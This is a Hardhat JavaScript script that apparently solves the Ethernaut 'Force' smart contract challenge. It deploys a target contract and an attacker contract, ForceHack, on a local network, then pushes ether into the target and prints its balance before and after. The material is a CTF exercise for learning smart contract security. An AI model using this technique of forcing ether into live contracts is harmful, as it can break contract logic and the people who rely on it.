const hre = require("hardhat")
const {utils} = require("ethers")
const {ethers} = require("hardhat")

async function main() {

    const account = await ethers.getSigners();

    const deployer = account[0]
    const hacker_account = account[1]

    console.log("Deploying contracts with the account:", deployer.address);
    console.log("Hacker Account balance:", (await hacker_account.getBalance()).toString());
    
    console.log("Force Contract Deploying")
    const force_con = await ethers.getContractFactory("contracts/Force.sol:Force", deployer);
    const d_force = await force_con.deploy()
    console.log("Force Contract deployed")

    const force_hack = await ethers.getContractFactory("ForceHack", hacker_account);
    console.log("Force Hack Deploying")    
    const d_hack = await force_hack.deploy(d_force.address)
    console.log("Force Hack Deployed")

    let con_bal = await ethers.provider.getBalance(d_force.address);
    console.log("Balance Before")
    console.log(con_bal)

    const giveBack = await d_hack.connect(hacker_account).giveValue({value: ethers.utils.parseEther("0.00001")});
    giveBack ? console.log("Gave value") : console.log("No value")

    con_bal = await ethers.provider.getBalance(d_force.address);
    console.log("Balance After")
    console.log(con_bal)


}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});